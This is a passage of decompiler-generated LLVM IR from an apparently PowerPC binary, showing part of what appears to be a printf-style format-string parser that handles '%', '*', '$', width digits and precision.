  %v0_1001b044 = phi i32 [ %v1_1001b1d8, %dec_label_pc_1001b1d8 ], [ %v0_1001b13c, %dec_label_pc_1001b154 ]
  %stack_var_-84.0 = phi i32 [ %stack_var_-84.3, %dec_label_pc_1001b1d8 ], [ %stack_var_-84.2, %dec_label_pc_1001b154 ]
  store i32 %v0_1001b044, i32* @r10, align 4
  br label %dec_label_pc_1001b048

dec_label_pc_1001b048:                            ; preds = %dec_label_pc_1001b028, %dec_label_pc_1001b044
  %v0_1001b05c = phi i32 [ %storemerge3, %dec_label_pc_1001b028 ], [ %v0_1001b044, %dec_label_pc_1001b044 ]
  %stack_var_-84.1 = phi i32 [ %tmp46, %dec_label_pc_1001b028 ], [ %stack_var_-84.0, %dec_label_pc_1001b044 ]
  %v1_1001b048 = inttoptr i32 %v0_1001b05c to i8*
  %v2_1001b048 = load i8, i8* %v1_1001b048, align 1
  %v3_1001b048 = zext i8 %v2_1001b048 to i32
  store i32 %v3_1001b048, i32* %r0.global-to-local, align 4
  store i32 %v0_1001b05c, i32* @r30, align 4
  %v3_1001b050 = icmp eq i8 %v2_1001b048, 42
  br i1 %v3_1001b050, label %dec_label_pc_1001b058, label %dec_label_pc_1001b068

dec_label_pc_1001b058:                            ; preds = %dec_label_pc_1001b048
  %v0_1001b058 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001b058 = mul i32 %v0_1001b058, -4
  store i32 %v1_1001b058, i32* %r0.global-to-local, align 4
  %v1_1001b05c = add i32 %v0_1001b05c, 1
  store i32 %v1_1001b05c, i32* @r30, align 4
  %v0_1001b060 = load i32, i32* @r1, align 4
  %v2_1001b060 = add i32 %v0_1001b060, %v1_1001b058
  store i32 %v2_1001b060, i32* %r9.global-to-local, align 4
  %v0_1001b064 = load i32, i32* @r27, align 4
  %v2_1001b064 = add i32 %v2_1001b060, 8
  %v3_1001b064 = inttoptr i32 %v2_1001b064 to i32*
  store i32 %v0_1001b064, i32* %v3_1001b064, align 4
  %v0_1001b080.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001b068

dec_label_pc_1001b068:                            ; preds = %dec_label_pc_1001b048, %dec_label_pc_1001b058
  %v0_1001b080.pre = phi i32 [ %v0_1001b05c, %dec_label_pc_1001b048 ], [ %v0_1001b080.pre.pre, %dec_label_pc_1001b058 ]
  %v0_1001b068 = load i32, i32* %r3.global-to-local, align 4
  %v1_1001b068 = add i32 %v0_1001b068, 20796
  %v2_1001b068 = inttoptr i32 %v1_1001b068 to i32*
  %v3_1001b068 = load i32, i32* %v2_1001b068, align 4
  store i32 %v3_1001b068, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1001b080

dec_label_pc_1001b074:                            ; preds = %dec_label_pc_1001b080
  %v2_1001b088 = icmp sgt i32 %v0_1001b0cc, 4094
  br i1 %v2_1001b088, label %dec_label_pc_1001b07c, label %dec_label_pc_1001b078

dec_label_pc_1001b078:                            ; preds = %dec_label_pc_1001b074
  %v1_1001b078 = add i32 %v2_1001b090, -48
  store i32 %v1_1001b078, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1001b07c

dec_label_pc_1001b07c:                            ; preds = %dec_label_pc_1001b074, %dec_label_pc_1001b078
  %v0_1001b08415 = phi i32 [ %v0_1001b0cc, %dec_label_pc_1001b074 ], [ %v1_1001b078, %dec_label_pc_1001b078 ]
  %v1_1001b07c = add i32 %v0_1001b0fc, 1
  store i32 %v1_1001b07c, i32* @r30, align 4
  br label %dec_label_pc_1001b080

dec_label_pc_1001b080:                            ; preds = %dec_label_pc_1001b068, %dec_label_pc_1001b07c
  %v0_1001b0cc = phi i32 [ 0, %dec_label_pc_1001b068 ], [ %v0_1001b08415, %dec_label_pc_1001b07c ]
  %v0_1001b0fc = phi i32 [ %v0_1001b080.pre, %dec_label_pc_1001b068 ], [ %v1_1001b07c, %dec_label_pc_1001b07c ]
  %v1_1001b080 = inttoptr i32 %v0_1001b0fc to i8*
  %v2_1001b080 = load i8, i8* %v1_1001b080, align 1
  %v3_1001b080 = zext i8 %v2_1001b080 to i32
  store i32 %v3_1001b080, i32* @r8, align 4
  %v1_1001b084 = mul i32 %v0_1001b0cc, 10
  %v1_1001b08c = mul nuw nsw i32 %v3_1001b080, 2
  store i32 %v1_1001b08c, i32* %r9.global-to-local, align 4
  %v2_1001b090 = add i32 %v3_1001b080, %v1_1001b084
  store i32 %v2_1001b090, i32* @r11, align 4
  %v2_1001b094 = add i32 %v1_1001b08c, %v3_1001b068
  %v3_1001b094 = inttoptr i32 %v2_1001b094 to i16*
  %v4_1001b094 = load i16, i16* %v3_1001b094, align 2
  %v5_1001b094 = zext i16 %v4_1001b094 to i32
  store i32 %v5_1001b094, i32* %r0.global-to-local, align 4
  %v1_1001b098 = and i32 %v5_1001b094, 8
  store i32 %v1_1001b098, i32* %r9.global-to-local, align 4
  %v3_1001b098 = icmp eq i32 %v1_1001b098, 0
  br i1 %v3_1001b098, label %dec_label_pc_1001b0a0, label %dec_label_pc_1001b074

dec_label_pc_1001b0a0:                            ; preds = %dec_label_pc_1001b080
  %v0_1001b0a0 = load i32, i32* @r10, align 4
  %v1_1001b0a0 = add i32 %v0_1001b0a0, -1
  %v2_1001b0a0 = inttoptr i32 %v1_1001b0a0 to i8*
  %v3_1001b0a0 = load i8, i8* %v2_1001b0a0, align 1
  %v4_1001b0a0 = zext i8 %v3_1001b0a0 to i32
  store i32 %v4_1001b0a0, i32* %r0.global-to-local, align 4
  %v3_1001b0a4 = icmp eq i8 %v3_1001b0a0, 37
  br i1 %v3_1001b0a4, label %dec_label_pc_1001b0ac, label %dec_label_pc_1001b174

dec_label_pc_1001b0ac:                            ; preds = %dec_label_pc_1001b0a0
  %v3_1001b0ac = icmp eq i8 %v2_1001b080, 36
  br i1 %v3_1001b0ac, label %dec_label_pc_1001b0b4, label %dec_label_pc_1001b0e8

dec_label_pc_1001b0b4:                            ; preds = %dec_label_pc_1001b0ac
  %tmp58 = icmp slt i32 %v0_1001b0cc, 1
  br i1 %tmp58, label %dec_label_pc_1001b0e8, label %dec_label_pc_1001b0bc

dec_label_pc_1001b0bc:                            ; preds = %dec_label_pc_1001b0b4
  %v0_1001b0bc = load i32, i32* @r26, align 4
  %v3_1001b0bc = icmp eq i32 %v0_1001b0bc, 0
  %v1_1001b0c0 = add i32 %v0_1001b0fc, 1
  store i32 %v1_1001b0c0, i32* @r10, align 4
  br i1 %v3_1001b0bc, label %dec_label_pc_1001b484, label %dec_label_pc_1001b0c8

dec_label_pc_1001b0c8:                            ; preds = %dec_label_pc_1001b0bc
  %v3_1001b0c8 = icmp sgt i32 %v0_1001b0cc, %v0_1001b0bc
  br i1 %v3_1001b0c8, label %dec_label_pc_1001b0d4, label %dec_label_pc_1001b0e0

dec_label_pc_1001b0d4:                            ; preds = %dec_label_pc_1001b0c8
  store i32 %v0_1001b0cc, i32* @r26, align 4
  br label %dec_label_pc_1001b0e0

dec_label_pc_1001b0dc:                            ; preds = %dec_label_pc_1001b104, %dec_label_pc_1001b0fc
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1001b0e0

dec_label_pc_1001b0e0:                            ; preds = %dec_label_pc_1001b0c8, %dec_label_pc_1001b0d4, %dec_label_pc_1001b0dc
  %v0_1001b0e0 = phi i32 [ %v0_1001b0a0, %dec_label_pc_1001b0dc ], [ %v1_1001b0c0, %dec_label_pc_1001b0d4 ], [ %v1_1001b0c0, %dec_label_pc_1001b0c8 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_1001b0dc ], [ %v0_1001b0cc, %dec_label_pc_1001b0d4 ], [ %v0_1001b0cc, %dec_label_pc_1001b0c8 ]
  br label %dec_label_pc_1001b11c

dec_label_pc_1001b0e8:                            ; preds = %dec_label_pc_1001b0ac, %dec_label_pc_1001b0b4
  %v0_1001b0e8 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_1001b0e8, 1
  br i1 %tmp59, label %dec_label_pc_1001b0fc, label %dec_label_pc_1001b0f0

dec_label_pc_1001b0f0:                            ; preds = %dec_label_pc_1001b0e8
  %v3_1001b0f0 = icmp eq i8 %v2_1001b080, 109
  br i1 %v3_1001b0f0, label %dec_label_pc_1001b174, label %dec_label_pc_1001b484

dec_label_pc_1001b0fc:                            ; preds = %dec_label_pc_1001b0e8
  %v3_1001b0fc = icmp ugt i32 %v0_1001b0fc, %v0_1001b0a0
  br i1 %v3_1001b0fc, label %dec_label_pc_1001b104, label %dec_label_pc_1001b0dc

dec_label_pc_1001b104:                            ; preds = %dec_label_pc_1001b0fc
  %v1_1001b104 = inttoptr i32 %v0_1001b0a0 to i8*
  %v2_1001b104 = load i8, i8* %v1_1001b104, align 1
  %v3_1001b104 = zext i8 %v2_1001b104 to i32
  store i32 %v3_1001b104, i32* %r0.global-to-local, align 4
  store i32 %v0_1001b0a0, i32* @r11, align 4
  store i32 0, i32* @r26, align 4
  %v3_1001b110 = icmp eq i8 %v2_1001b104, 48
  br i1 %v3_1001b110, label %dec_label_pc_1001b0dc, label %dec_label_pc_1001b178

dec_label_pc_1001b11c:                            ; preds = %dec_label_pc_1001b138, %dec_label_pc_1001b0e0
  %v0_1001b13c = phi i32 [ %v0_1001b0e0, %dec_label_pc_1001b0e0 ], [ %v1_1001b13c, %dec_label_pc_1001b138 ]
  store i32 %v0_1001b13c, i32* @r30, align 4
  %v1_1001b12c = inttoptr i32 %v0_1001b13c to i8*
  br label %dec_label_pc_1001b124

dec_label_pc_1001b124:                            ; preds = %dec_label_pc_1001b144, %dec_label_pc_1001b11c
  %v1_1001b138 = phi i32 [ %v1_1001b148, %dec_label_pc_1001b144 ], [ 1, %dec_label_pc_1001b11c ]
  %v0_1001b124 = phi i32 [ %v1_1001b128, %dec_label_pc_1001b144 ], [ ptrtoint ([8 x i8]* @global_var_1002e474.1171 to i32), %dec_label_pc_1001b11c ]
  %v1_1001b124 = inttoptr i32 %v0_1001b124 to i8*
  %v2_1001b124 = load i8, i8* %v1_1001b124, align 1
  %v3_1001b124 = zext i8 %v2_1001b124 to i32
  store i32 %v3_1001b124, i32* %r9.global-to-local, align 4
  %v1_1001b128 = add i32 %v0_1001b124, 1
  store i32 %v1_1001b128, i32* @r11, align 4
  %v2_1001b12c = load i8, i8* %v1_1001b12c, align 1
  %v3_1001b12c = zext i8 %v2_1001b12c to i32
  store i32 %v3_1001b12c, i32* %r0.global-to-local, align 4
  %v4_1001b130 = icmp eq i8 %v2_1001b12c, %v2_1001b124
  br i1 %v4_1001b130, label %dec_label_pc_1001b138, label %dec_label_pc_1001b144

dec_label_pc_1001b138:                            ; preds = %dec_label_pc_1001b124
  %v0_1001b138 = load i32, i32* %r5.global-to-local, align 4
  %v2_1001b138 = or i32 %v0_1001b138, %v1_1001b138
  store i32 %v2_1001b138, i32* %r5.global-to-local, align 4
  %v1_1001b13c = add i32 %v0_1001b13c, 1
  br label %dec_label_pc_1001b11c

dec_label_pc_1001b144:                            ; preds = %dec_label_pc_1001b124
  %v1_1001b144 = inttoptr i32 %v1_1001b128 to i8*
  %v2_1001b144 = load i8, i8* %v1_1001b144, align 1
  %v3_1001b144 = zext i8 %v2_1001b144 to i32
  store i32 %v3_1001b144, i32* %r0.global-to-local, align 4
  %v1_1001b148 = mul i32 %v1_1001b138, 2
  store i32 %v1_1001b148, i32* @r10, align 4
  %v3_1001b14c = icmp eq i8 %v2_1001b144, 0
  br i1 %v3_1001b14c, label %dec_label_pc_1001b154, label %dec_label_pc_1001b124

dec_label_pc_1001b154:                            ; preds = %dec_label_pc_1001b144
  %v1_1001b154 = add i32 %v0_1001b13c, -1
  %v2_1001b154 = inttoptr i32 %v1_1001b154 to i8*
  %v3_1001b154 = load i8, i8* %v2_1001b154, align 1
  %v4_1001b154 = zext i8 %v3_1001b154 to i32
  store i32 %v4_1001b154, i32* %r0.global-to-local, align 4
  %v0_1001b158 = load i32, i32* %r5.global-to-local, align 4
  %v1_1001b158 = and i32 %v0_1001b158, 10
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1001b160 = udiv i32 %v1_1001b158, 2
  store i32 %v1_1001b160, i32* %r9.global-to-local, align 4
  %v3_1001b164 = icmp eq i8 %v3_1001b154, 37
  %v2_1001b168 = sub nuw nsw i32 -1, %v1_1001b160
  %v3_1001b168 = and i32 %v0_1001b158, %v2_1001b168
  store i32 %v3_1001b168, i32* %r5.global-to-local, align 4
  br i1 %v3_1001b164, label %dec_label_pc_1001b178, label %dec_label_pc_1001b044

dec_label_pc_1001b174:                            ; preds = %dec_label_pc_1001b0a0, %dec_label_pc_1001b0f0
  store i32 %v0_1001b0a0, i32* @r11, align 4
  br label %dec_label_pc_1001b178

dec_label_pc_1001b178:                            ; preds = %dec_label_pc_1001b104, %dec_label_pc_1001b154, %dec_label_pc_1001b174
  %v0_1001b1ac = phi i32 [ 0, %dec_label_pc_1001b154 ], [ %v0_1001b0cc, %dec_label_pc_1001b104 ], [ %v0_1001b0cc, %dec_label_pc_1001b174 ]
  %v1_1001b1b8 = phi i32 [ %v0_1001b13c, %dec_label_pc_1001b154 ], [ %v0_1001b0fc, %dec_label_pc_1001b104 ], [ %v0_1001b0fc, %dec_label_pc_1001b174 ]
  %v0_1001b1b4 = phi i32 [ %v1_1001b128, %dec_label_pc_1001b154 ], [ %v0_1001b0a0, %dec_label_pc_1001b104 ], [ %v0_1001b0a0, %dec_label_pc_1001b174 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1001b154 ], [ %stack_var_-84.1, %dec_label_pc_1001b104 ], [ %stack_var_-84.1, %dec_label_pc_1001b174 ]
  %v1_1001b178 = inttoptr i32 %v0_1001b1b4 to i8*
  %v2_1001b178 = load i8, i8* %v1_1001b178, align 1
  %v3_1001b178 = zext i8 %v2_1001b178 to i32
  store i32 %v3_1001b178, i32* %r0.global-to-local, align 4
  %v3_1001b17c = icmp eq i8 %v2_1001b178, 42
  br i1 %v3_1001b17c, label %dec_label_pc_1001b184, label %dec_label_pc_1001b1c4

dec_label_pc_1001b184:                            ; preds = %dec_label_pc_1001b178
  %v0_1001b184 = load i32, i32* @r26, align 4
  %v3_1001b184 = icmp eq i32 %v0_1001b184, 0
  br i1 %v3_1001b184, label %dec_label_pc_1001b1b4, label %dec_label_pc_1001b18c

dec_label_pc_1001b18c:                            ; preds = %dec_label_pc_1001b184
  %v1_1001b18c = inttoptr i32 %v1_1001b1b8 to i8*
  %v2_1001b18c = load i8, i8* %v1_1001b18c, align 1
  %v3_1001b18c = zext i8 %v2_1001b18c to i32
  store i32 %v3_1001b18c, i32* %r0.global-to-local, align 4
  %v3_1001b190 = icmp eq i8 %v2_1001b18c, 36
  br i1 %v3_1001b190, label %dec_label_pc_1001b198, label %dec_label_pc_1001b484

dec_label_pc_1001b198:                            ; preds = %dec_label_pc_1001b18c
  %tmp60 = icmp slt i32 %v0_1001b1ac, 1
  br i1 %tmp60, label %dec_label_pc_1001b484, label %dec_label_pc_1001b1a0

dec_label_pc_1001b1a0:                            ; preds = %dec_label_pc_1001b198
  %v0_1001b1a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1001b1a0 = mul i32 %v0_1001b1a0, -4
  %v1_1001b1a4 = add i32 %v1_1001b1b8, 1
  store i32 %v1_1001b1a4, i32* @r30, align 4
  %v0_1001b1a8 = load i32, i32* @r29, align 4
  %v2_1001b1a8 = add i32 %v0_1001b1a8, %v1_1001b1a0
  store i32 %v2_1001b1a8, i32* %r9.global-to-local, align 4
  %v2_1001b1ac = add i32 %v2_1001b1a8, 12
  %v3_1001b1ac = inttoptr i32 %v2_1001b1ac to i32*
  store i32 %v0_1001b1ac, i32* %v3_1001b1ac, align 4
  %v0_1001b1cc.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001b1c0

dec_label_pc_1001b1b4:                            ; preds = %dec_label_pc_1001b184
  %v1_1001b1b4 = add i32 %v0_1001b1b4, 1
  store i32 %v1_1001b1b4, i32* %r0.global-to-local, align 4
  %v4_1001b1b8 = icmp eq i32 %v1_1001b1b4, %v1_1001b1b8
  br i1 %v4_1001b1b8, label %dec_label_pc_1001b1c0, label %dec_label_pc_1001b484

dec_label_pc_1001b1c0:                            ; preds = %dec_label_pc_1001b1b4, %dec_label_pc_1001b1a0
  %v0_1001b1cc.pre = phi i32 [ %v1_1001b1b8, %dec_label_pc_1001b1b4 ], [ %v0_1001b1cc.pre.pre, %dec_label_pc_1001b1a0 ]
  store i32 -2147483648, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1001b1c4

dec_label_pc_1001b1c4:                            ; preds = %dec_label_pc_1001b178, %dec_label_pc_1001b1c0
  %v0_1001b1cc = phi i32 [ %v1_1001b1b8, %dec_label_pc_1001b178 ], [ %v0_1001b1cc.pre, %dec_label_pc_1001b1c0 ]
  %v0_1001b1dc = phi i32 [ %v0_1001b1ac, %dec_label_pc_1001b178 ], [ -2147483648, %dec_label_pc_1001b1c0 ]
  %v0_1001b1c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_1001b1c4 = icmp eq i32 %v0_1001b1c4, 0
  %v1_1001b1cc = inttoptr i32 %v0_1001b1cc to i8*
  br i1 %v3_1001b1c4, label %dec_label_pc_1001b1cc, label %dec_label_pc_1001b1f0

dec_label_pc_1001b1cc:                            ; preds = %dec_label_pc_1001b1c4
  %v2_1001b1cc = load i8, i8* %v1_1001b1cc, align 1
  %v3_1001b1cc = zext i8 %v2_1001b1cc to i32
  store i32 %v3_1001b1cc, i32* %r0.global-to-local, align 4
  %v3_1001b1d0 = icmp eq i8 %v2_1001b1cc, 46
  br i1 %v3_1001b1d0, label %dec_label_pc_1001b1d8, label %dec_label_pc_1001b1e8

dec_label_pc_1001b1d8:                            ; preds = %dec_label_pc_1001b1cc
  %v1_1001b1d8 = add i32 %v0_1001b1cc, 1
  store i32 %v0_1001b1dc, i32* @r31, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1001b044

dec_label_pc_1001b1e8:                            ; preds = %dec_label_pc_1001b1cc
  store i32 %v0_1001b1dc, i32* @r31, align 4
  br label %dec_label_pc_1001b1f0

dec_label_pc_1001b1f0:                            ; preds = %dec_label_pc_1001b1c4, %dec_label_pc_1001b1e8
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1001b1e8 ], [ %v0_1001b1dc, %dec_label_pc_1001b1c4 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  %v2_1001b1f0 = load i8, i8* %v1_1001b1cc, align 1
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1002e41c.1172 to i32), i32* @r11, align 4
  br label %dec_label_pc_1001b1fc

dec_label_pc_1001b1fc:                            ; preds = %dec_label_pc_1001b208, %dec_label_pc_1001b1f0
  %v0_1001b208 = phi i32 [ %v1_1001b208, %dec_label_pc_1001b208 ], [ ptrtoint ([9 x i8]* @global_var_1002e41c.1172 to i32), %dec_label_pc_1001b1f0 ]
  %v1_1001b1fc = inttoptr i32 %v0_1001b208 to i8*
  %v2_1001b1fc = load i8, i8* %v1_1001b1fc, align 1
  %v3_1001b1fc = zext i8 %v2_1001b1fc to i32
  store i32 %v3_1001b1fc, i32* %r0.global-to-local, align 4
  %v4_1001b200 = icmp eq i8 %v2_1001b1f0, %v2_1001b1fc
  br i1 %v4_1001b200, label %dec_label_pc_1001afcc, label %dec_label_pc_1001b208

dec_label_pc_1001b208:                            ; preds = %dec_label_pc_1001b1fc
  %v1_1001b208 = add i32 %v0_1001b208, 1
  %v2_1001b208 = inttoptr i32 %v1_1001b208 to i8*
  %v3_1001b208 = load i8, i8* %v2_1001b208, align 1
  %v4_1001b208 = zext i8 %v3_1001b208 to i32
  store i32 %v4_1001b208, i32* %r0.global-to-local, align 4
  store i32 %v1_1001b208, i32* @r11, align 4
  %v3_1001b20c = icmp eq i8 %v3_1001b208, 0
  br i1 %v3_1001b20c, label %dec_label_pc_1001b214, label %dec_label_pc_1001b1fc

dec_label_pc_1001b214:                            ; preds = %dec_label_pc_1001b208, %dec_label_pc_1001afcc
  %v0_1001b23c = phi i32 [ %v1_1001afcc, %dec_label_pc_1001afcc ], [ %v0_1001b1cc, %dec_label_pc_1001b208 ]
  %v0_1001b238 = phi i32 [ %v0_1001b208, %dec_label_pc_1001afcc ], [ %v1_1001b208, %dec_label_pc_1001b208 ]
  %v2_1001b21c = sub i32 %v0_1001b238, ptrtoint ([9 x i8]* @global_var_1002e41c.1172 to i32)
  store i32 %v2_1001b21c, i32* %r9.global-to-local, align 4
  %v2_1001b220 = icmp sgt i32 %v2_1001b21c, 1
  br i1 %v2_1001b220, label %dec_label_pc_1001b240, label %dec_label_pc_1001b228

dec_label_pc_1001b228:                            ; preds = %dec_label_pc_1001b214
  %v1_1001b228 = inttoptr i32 %v0_1001b23c to i8*
  %v2_1001b228 = load i8, i8* %v1_1001b228, align 1
  %v3_1001b228 = zext i8 %v2_1001b228 to i32
  store i32 %v3_1001b228, i32* %r0.global-to-local, align 4
  %v1_1001b22c = inttoptr i32 %v0_1001b238 to i8*
  %v2_1001b22c = load i8, i8* %v1_1001b22c, align 1
  %v3_1001b22c = zext i8 %v2_1001b22c to i32
  store i32 %v3_1001b22c, i32* %r9.global-to-local, align 4
  %v4_1001b230 = icmp eq i8 %v2_1001b228, %v2_1001b22c
  br i1 %v4_1001b230, label %dec_label_pc_1001b238, label %dec_label_pc_1001b240

dec_label_pc_1001b238:                            ; preds = %dec_label_pc_1001b228
  %v1_1001b238 = add i32 %v0_1001b238, 9
  store i32 %v1_1001b238, i32* @r11, align 4
  %v1_1001b23c = add i32 %v0_1001b23c, 1
  store i32 %v1_1001b23c, i32* @r30, align 4
  br label %dec_label_pc_1001b240

dec_label_pc_1001b240:                            ; preds = %dec_label_pc_1001b228, %dec_label_pc_1001b214, %dec_label_pc_1001b238
  %v0_1001b244 = phi i32 [ %v0_1001b238, %dec_label_pc_1001b228 ], [ %v0_1001b238, %dec_label_pc_1001b214 ], [ %v1_1001b238, %dec_label_pc_1001b238 ]
  %v0_1001b240 = phi i32 [ %v0_1001b23c, %dec_label_pc_1001b228 ], [ %v0_1001b23c, %dec_label_pc_1001b214 ], [ %v1_1001b23c, %dec_label_pc_1001b238 ]
  %v1_1001b240 = inttoptr i32 %v0_1001b240 to i8*
  %v2_1001b240 = load i8, i8* %v1_1001b240, align 1
  %v3_1001b240 = zext i8 %v2_1001b240 to i32
  store i32 %v3_1001b240, i32* @r10, align 4
  %v1_1001b244 = add i32 %v0_1001b244, 9
  %v2_1001b244 = inttoptr i32 %v1_1001b244 to i8*
  %v3_1001b244 = load i8, i8* %v2_1001b244, align 1
  %v4_1001b244 = zext i8 %v3_1001b244 to i32
  store i32 %v4_1001b244, i32* %r0.global-to-local, align 4
  %v3_1001b248 = icmp eq i8 %v2_1001b240, 0
  %v1_1001b24c = mul nuw nsw i32 %v4_1001b244, 256
  store i32 %v1_1001b24c, i32* @r8, align 4
  br i1 %v3_1001b248, label %dec_label_pc_1001b484, label %dec_label_pc_1001b254

dec_label_pc_1001b254:                            ; preds = %dec_label_pc_1001b240
  %v3_1001b258 = load i32, i32* %stack_var_-96, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1002e45c.1173 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r3.global-to-local, align 4
  %v1_1001b264 = and i32 %v1_1001b24c, 1024
  store i32 %v1_1001b264, i32* %r0.global-to-local, align 4
  %v3_1001b264 = icmp eq i32 %v1_1001b264, 0
  store i32 ptrtoint (i32* @global_var_1002e450.1174 to i32), i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1002e45c.1173 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001b274

dec_label_pc_1001b274:                            ; preds = %dec_label_pc_1001b2d8, %dec_label_pc_1001b254
  %v1_1001b280 = phi i32 [ %v1_1001b2d8, %dec_label_pc_1001b2d8 ], [ ptrtoint ([21 x i8]* @global_var_1002e45c.1173 to i32), %dec_label_pc_1001b254 ]
  %v1_1001b274 = inttoptr i32 %v1_1001b280 to i8*
  %v2_1001b274 = load i8, i8* %v1_1001b274, align 1
  %v3_1001b274 = zext i8 %v2_1001b274 to i32
  store i32 %v3_1001b274, i32* %r0.global-to-local, align 4
  %v4_1001b278 = icmp eq i8 %v2_1001b274, %v2_1001b240
  br i1 %v4_1001b278, label %dec_label_pc_1001b280, label %dec_label_pc_1001b2d8

dec_label_pc_1001b280:                            ; preds = %dec_label_pc_1001b274
  %v2_1001b280 = sub i32 %v1_1001b280, ptrtoint ([21 x i8]* @global_var_1002e45c.1173 to i32)
  %tmp61 = icmp slt i32 %v2_1001b280, 18
  %brmerge = or i1 %v3_1001b264, %tmp61
  br i1 %brmerge, label %dec_label_pc_1001b294, label %dec_label_pc_1001b290

dec_label_pc_1001b290:                            ; preds = %dec_label_pc_1001b280
  %v1_1001b290 = add i32 %v2_1001b280, -2
  br label %dec_label_pc_1001b294

dec_label_pc_1001b294:                            ; preds = %dec_label_pc_1001b280, %dec_label_pc_1001b290
  %storemerge = phi i32 [ %v1_1001b290, %dec_label_pc_1001b290 ], [ %v2_1001b280, %dec_label_pc_1001b280 ]
  %v0_1001b294 = phi i32 [ %v1_1001b290, %dec_label_pc_1001b290 ], [ %v2_1001b280, %dec_label_pc_1001b280 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1001b294 = load i32, i32* @r28, align 4
  %v2_1001b294 = add i32 %v1_1001b294, 32
  %v3_1001b294 = inttoptr i32 %v2_1001b294 to i32*
  store i32 %v0_1001b294, i32* %v3_1001b294, align 4
  %v0_1001b2a0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001b29c

dec_label_pc_1001b29c:                            ; preds = %dec_label_pc_1001b29c, %dec_label_pc_1001b294
  %v0_1001b29c = phi i32 [ %v1_1001b29c, %dec_label_pc_1001b29c ], [ ptrtoint (i32* @global_var_1002e44f.1175 to i32), %dec_label_pc_1001b294 ]
  %v1_1001b29c = add i32 %v0_1001b29c, 1
  %v2_1001b29c = inttoptr i32 %v1_1001b29c to i8*
  %v3_1001b29c = load i8, i8* %v2_1001b29c, align 1
  %v4_1001b29c = zext i8 %v3_1001b29c to i32
  store i32 %v4_1001b29c, i32* %r0.global-to-local, align 4
  %v3_1001b2a0 = icmp sgt i32 %v0_1001b2a0.pre, %v4_1001b29c
  br i1 %v3_1001b2a0, label %dec_label_pc_1001b29c, label %dec_label_pc_1001b2a8

dec_label_pc_1001b2a8:                            ; preds = %dec_label_pc_1001b29c
  %v0_1001b2a8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1001b2a8 = sub i32 %v1_1001b29c, %v0_1001b2a8
  %v1_1001b2b0 = mul i32 %v2_1001b2a8, 2
  store i32 %v1_1001b2b0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002e440.1176 to i32), i32* %r9.global-to-local, align 4
  %v2_1001b2b8 = add i32 %v1_1001b2b0, ptrtoint (i32* @global_var_1002e440.1176 to i32)
  %v3_1001b2b8 = inttoptr i32 %v2_1001b2b8 to i16*
  %v4_1001b2b8 = load i16, i16* %v3_1001b2b8, align 2
  %v5_1001b2b8 = sext i16 %v4_1001b2b8 to i32
  store i32 ptrtoint (i32* @global_var_1002e430.1177 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1002e45c.1173 to i32), i32* %r7.global-to-local, align 4
  %v2_1001b2c8 = add i32 %v1_1001b2b0, ptrtoint (i32* @global_var_1002e430.1177 to i32)
  %v3_1001b2c8 = inttoptr i32 %v2_1001b2c8 to i16*
  %v4_1001b2c8 = load i16, i16* %v3_1001b2c8, align 2
  %v5_1001b2c8 = sext i16 %v4_1001b2c8 to i32
  store i32 %v5_1001b2c8, i32* %r0.global-to-local, align 4
  %v2_1001b2cc = or i32 %v5_1001b2b8, %v1_1001b24c
  %v2_1001b2d0 = and i32 %v5_1001b2c8, %v2_1001b2cc
  br label %dec_label_pc_1001b2e4

dec_label_pc_1001b2d8:                            ; preds = %dec_label_pc_1001b274
  %v1_1001b2d8 = add i32 %v1_1001b280, 1
  %v2_1001b2d8 = inttoptr i32 %v1_1001b2d8 to i8*
  %v3_1001b2d8 = load i8, i8* %v2_1001b2d8, align 1
  %v4_1001b2d8 = zext i8 %v3_1001b2d8 to i32
  store i32 %v4_1001b2d8, i32* %r0.global-to-local, align 4
  store i32 %v1_1001b2d8, i32* %r7.global-to-local, align 4
  %v3_1001b2dc = icmp eq i8 %v3_1001b2d8, 0
  br i1 %v3_1001b2dc, label %dec_label_pc_1001b2e4, label %dec_label_pc_1001b274

dec_label_pc_1001b2e4:                            ; preds = %dec_label_pc_1001b2d8, %dec_label_pc_1001b2a8
  %v0_1001b2e4 = phi i32 [ %v2_1001b2d0, %dec_label_pc_1001b2a8 ], [ %v3_1001b258, %dec_label_pc_1001b2d8 ]
  store i32 %v0_1001b2e4, i32* %stack_var_-96, align 4
  %v0_1001b2e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1001b2e8 = call i32 @__asm_rlwinm(i32 %v0_1001b2e8, i32 30, i32 31, i32 31)
  %not.v2_1001b2ec = icmp eq i32 %v1_1001b2e8, 0
  %v6_1001b2f0 = sext i1 %not.v2_1001b2ec to i32
  store i32 %v6_1001b2f0, i32* %r9.global-to-local, align 4
  %v1_1001b2f4 = call i32 @__asm_rlwinm(i32 %v1_1001b24c, i32 0, i32 20, i32 23)
